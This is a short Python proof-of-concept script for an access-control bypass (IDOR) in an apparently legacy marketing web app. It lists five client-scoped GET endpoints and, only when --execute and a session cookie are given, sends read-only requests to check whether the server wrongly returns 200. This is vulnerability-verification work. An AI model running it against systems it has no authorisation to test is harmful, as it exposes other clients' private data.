#!/usr/bin/env python3
"""Safe-by-default PoC scaffold for legacy Digital Marketing read IDOR."""

import argparse
import urllib.error
import urllib.request


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", default="http://127.0.0.1:8000")
    parser.add_argument("--client-id", type=int, required=True)
    parser.add_argument("--platform", default="Instagram")
    parser.add_argument("--session-cookie")
    parser.add_argument("--execute", action="store_true")
    args = parser.parse_args()
    paths = [
        f"/market_research/{args.client_id}/{args.platform}",
        f"/branding/{args.client_id}/{args.platform}",
        f"/manajemen/{args.client_id}/{args.platform}",
        f"/api/manajemen-konten/{args.client_id}/{args.platform}",
        f"/exportPDF/{args.client_id}/Market%20Research?platform={args.platform}",
    ]

    print("1. Prerequisite: authenticated user without assignment to the target client.")
    print("2. Read-only triggers:")
    for path in paths:
        print(f"   GET {args.base_url.rstrip('/')}{path}")
    print("3. Secure result should be 403/404 for every path; a 200 response confirms the bypass.")
    print("4. Do not invoke /analisis in a PoC: that GET can call providers and persist snapshots.")
    if not args.execute:
        print("Dry run only. Add --execute and --session-cookie to send read-only requests.")
        return
    if not args.session_cookie:
        parser.error("--session-cookie is required with --execute")

    for path in paths:
        request = urllib.request.Request(
            f"{args.base_url.rstrip('/')}{path}",
            headers={"Cookie": args.session_cookie, "Accept": "text/html,application/json"},
        )
        try:
            with urllib.request.urlopen(request, timeout=15) as response:
                print(f"{path}: HTTP {response.status}")
        except urllib.error.HTTPError as error:
            print(f"{path}: HTTP {error.code}")


if __name__ == "__main__":
    main()
